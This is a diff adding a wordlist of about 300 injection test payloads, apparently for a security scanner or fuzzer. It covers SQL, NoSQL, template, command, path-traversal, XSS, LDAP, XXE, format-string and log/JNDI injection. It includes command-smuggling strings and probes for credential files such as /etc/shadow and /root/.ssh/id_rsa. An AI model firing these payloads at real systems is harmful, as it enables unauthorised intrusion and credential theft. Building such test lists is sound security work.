@@ -1,0 +1,368 @@
+# Injection payloads. Non-destructive by design: arithmetic markers, harmless
+# commands, and read-only file probes. Nothing that writes, drops or deletes.
+# Targets ~300 entries across SQLi, NoSQL, template, command, path, LDAP, XSS
+# markers, format strings and log injection.
+
+# --- SQL injection: quote and boolean forms ---
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+' OR ''='
+') OR ('1'='1
+' OR 1 LIKE 1--
+" OR "1"="1
+' OR true--
+' OR 1=1 LIMIT 1--
+' OR 1=1 --
+' OR 1=1;
+' OR 2>1--
+' OR 'a'='a
+' OR 'x'='x'--
+' OR 1 BETWEEN 1 AND 1--
+' OR EXISTS(SELECT 1)--
+' OR NOT 1=2--
+' OR 1 IS NOT NULL--
+') OR 1=1--
+')) OR 1=1--
+" ') OR ('1'='1--
+' OR '1'='1' --
+" OR ""=""
+' OR ''='
+' OR 1=1--
+'||'1'='1
+' OR 0x31=0x31--
+' OR 1e0=1--
+' OR TRUE--
+' OR !FALSE--
+
+# --- SQL injection: UNION and stacked statements (read-only) ---
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' GROUP BY 1--
+1' HAVING 1=1--
+1' UNION SELECT NULL--
+1 UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION ALL SELECT NULL--
+1' UNION SELECT 1--
+-1 UNION SELECT 1--
+1 UNION SELECT 1,2,3--
+1' UNION SELECT NULL-- -
+1; SELECT 1--
+'; SELECT 1--
+'; SELECT 1; --
+1'; SELECT 1--
+1; SELECT NULL--
+1' AND 1=(SELECT 1)--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND 1=CONVERT(int,(SELECT 1))--
+1' AND extractvalue(1,concat(0x7e,(SELECT 1)))--
+1' AND updatexml(1,concat(0x7e,(SELECT 1)),1)--
+1' AND 1=CAST(1 AS int)--
+
+# --- SQL injection: time-based, zero delay ---
+' AND SLEEP(0)--
+'; SELECT pg_sleep(0)--
+'; WAITFOR DELAY '0:0:0'--
+' AND SLEEP(0) AND '1'='1
+1' AND SLEEP(0)#
+'; SELECT pg_sleep(0); --
+' AND BENCHMARK(1,MD5(1))--
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(0))x)--
+'; SELECT DBMS_LOCK.SLEEP(0) FROM dual; --
+
+# --- SQL injection: database-specific system probes (read-only) ---
+' AND @@version IS NOT NULL--
+' AND version() IS NOT NULL--
+' AND sqlite_version() IS NOT NULL--
+' AND DBMS_XMLGEN.GETXML('SELECT 1') IS NOT NULL--
+' AND load_file('/etc/passwd') IS NOT NULL--
+' AND 1=1 AND 'a'='a' --
+' AND user IS NOT NULL--
+' AND current_user IS NOT NULL--
+' AND table_name IS NOT NULL--
+' AND 1=1 ORDER BY (SELECT NULL)--
+' AND 1=1 LIMIT 0--
+' AND 1=1 OFFSET 0--
+%27%20OR%201%3D1--
+%27%20OR%20%271%27%3D%271
+%2527%20OR%201=1--
+'%20OR%201=1--
+' OR/**/1=1--
+'/**/OR/**/1=1--
+'%09OR%091=1--
+'%0AOR%0A1=1--
+' OR 1=1%00--
+UniOn SeLeCt 1--
+uNiOn/**/sElEcT/**/NULL--
+
+# --- NoSQL injection ---
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$gte": ""}
+{"$where": "1==1"}
+{"$where": "function(){return true}"}
+{"$regex": ".*"}
+{"$regex": "^a"}
+{"$exists": true}
+{"$type": "string"}
+{"$or": []}
+{"$and": []}
+{"$in": ["admin"]}
+{"$nin": []}
+{"$not": {"$eq": "x"}}
+{"$elemMatch": {"$ne": null}}
+[$ne]=1
+[$gt]=
+[$where]=1
+{"username": {"$ne": null}}
+{"username": {"$regex": "^"}}
+username[$ne]=x
+' || '1'=='1
+' || ''==''
+'; return true; var a='
+
+# --- Template injection ---
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+%{7*7}
+@{7*7}
+*{7*7}
+{{7*'7'}}
+{{ 7 * 7 }}
+{{7*7}}
+${7*'7'}
+#{7*7}
+<#assign x=1>
+${7*7}
+${{ 7*7 }}
+{{config}}
+{{self}}
+{{this}}
+{{''.__class__}}
+{{ ''.__class__.__mro__ }}
+{{request}}
+{{settings}}
+{{env}}
+{{7*7}}{{'7'*7}}
+${"".getClass()}
+${{"".getClass()}}
+#{7*7}${7*7}
+<%= 7 * 7 %>
+<%= 7*7 %>
+@(7*7)
+~{7*7}
+{{{7*7}}}
+{{= 7*7 }}
+${ ${7*7} }
+{{7*7|join}}
+{{[].__class__}}
+{{cycler.__init__.__globals__}}
+{{config.__class__}}
+{{lipsum.__globals__}}
+{{namespace}}
+#set($x=7*7)
+$class.inspect('java.lang.String')
+<#list 1..1 as i>${i}</#list>
+
+# --- Command injection: harmless commands only ---
+`id`
+$(id)
+;id
+|id
+&&id
+||id
+; id
+| id
+& id
+&& id
+;id;
+;id#
+;id%00
+%3Bid
+%26%26id
+%7Cid
+%60id%60
+$(id)
+$((1+1))
+`whoami`
+$(whoami)
+;whoami
+|whoami
+&&whoami
+`uname -a`
+;uname -a
+|uname -a
+$(uname)
+; sleep 0
+| sleep 0
+&& sleep 0
+`sleep 0`
+$(sleep 0)
+;ping -c 0 127.0.0.1
+|ping -n 0 127.0.0.1
+;echo ok
+|echo ok
+&&echo ok
+`echo ok`
+$(echo ok)
+;Write-Output 1
+; powershell -Command 1
+cmd.exe /c echo ok
+sh -c id
+/bin/sh -c id
+%0aid
+%0a id
+%0Aid
+%0did
+%0d%0aid
+"\nid"
+'\nid'
+;\nid
+
+# --- Path traversal and file probes (read-only) ---
+../../../../../../etc/passwd
+..\..\..\..\..\windows\win.ini
+/etc/passwd
+C:\Windows\win.ini
+file:///etc/passwd
+php://filter/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+zip:///etc/passwd
+expect://id
+data://text/plain,1
+../../../../../../windows/system32/drivers/etc/hosts
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%252e%252e%252fetc%252fpasswd
+..%252f..%252fetc%252fpasswd
+....//....//etc/passwd
+..../....//etc/passwd
+..;/..;/etc/passwd
+..%c0%af..%c0%afetc/passwd
+..%e0%80%afetc/passwd
+/....//etc/passwd
+\\..\..\etc\passwd
+C:/Windows/win.ini
+/var/www/html/../../etc/passwd
+/././././etc/passwd
+/etc/./passwd
+/etc//passwd
+/etc/passwd%00
+/etc/passwd%00.png
+/etc/passwd\x00
+/etc/shadow
+/proc/self/environ
+/proc/self/cmdline
+/root/.ssh/id_rsa
+/root/.bash_history
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+\\localhost\c$\windows\win.ini
+
+# --- Cross-site scripting markers (client-side only) ---
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+<details open ontoggle=alert(1)>
+<math><mi xlink:href="javascript:alert(1)">1</mi></math>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">x</a>
+"><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+'-alert(1)-'
+"-alert(1)-"
+{{constructor.constructor('return 1')()}}
+
+# --- Format strings ---
+%s%s%s%s
+%x%x%x%x
+%p%p%p%p
+%n%n%n%n
+%99999999s
+%1$s
+%08x
+%*d
+%.1000f
+%{}
+%(name)s
+
+# --- LDAP injection ---
+*)(uid=*
+*)(|(uid=*
+admin*
+admin*)((|userPassword=*
+*))(|(objectClass=*
+*)(objectClass=*))
+*)(cn=*
+)(cn=*
+x)(|(cn=a*
+\2a)(uid=*
+
+# --- XML external entity probes (read-only) ---
+<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]>
+<!DOCTYPE x [<!ENTITY % p SYSTEM "http://127.0.0.1:1/x">%p;]>
+<?xml version="1.0"?><!DOCTYPE x SYSTEM "file:///etc/passwd">
+
+# --- Header and log injection ---
+%0d%0aX-Injected: 1
+%0aX-Injected: 1
+\r\nX-Injected: 1
+\nX-Injected: 1
+%0d%0aSet-Cookie: kilhook=1
+%0d%0a%0d%0a<html>kilhook</html>
+${jndi:ldap://127.0.0.1:1/x}
+${jndi:dns://127.0.0.1:1/x}
+${${env:1:-x}}
+${jndi:${lower:l}dap://127.0.0.1:1/x}
+
+# --- Encoding and unicode edge cases aimed at parsers ---
+\uffff
+\u0000
+%00
+%0a%0d
+\x00
+\u202e
+\u200b
+\uFEFF
+%ef%bf%bd
+%c0%af
+%ed%a0%80
+%F0%9F%92%A9
+<script>alert(1)</script>
+"; SELECT 1; --
+' OR '1'='1' /*
+
+# --- Structured payloads that break naive parsers ---
+{"a":1}{"b":2}
+{"a":1,}
+[,]
+{,}
+[1,,2]
+{"a":}
+{"a":1,"a":2}
+{"__proto__":{"x":1}}
+{"constructor":{"prototype":{"x":1}}}
+{"@type":"x"}
+{"$ref":"#/x"}
+{"a":"\ud800"}
+{"a":"\ud800\udc00"}
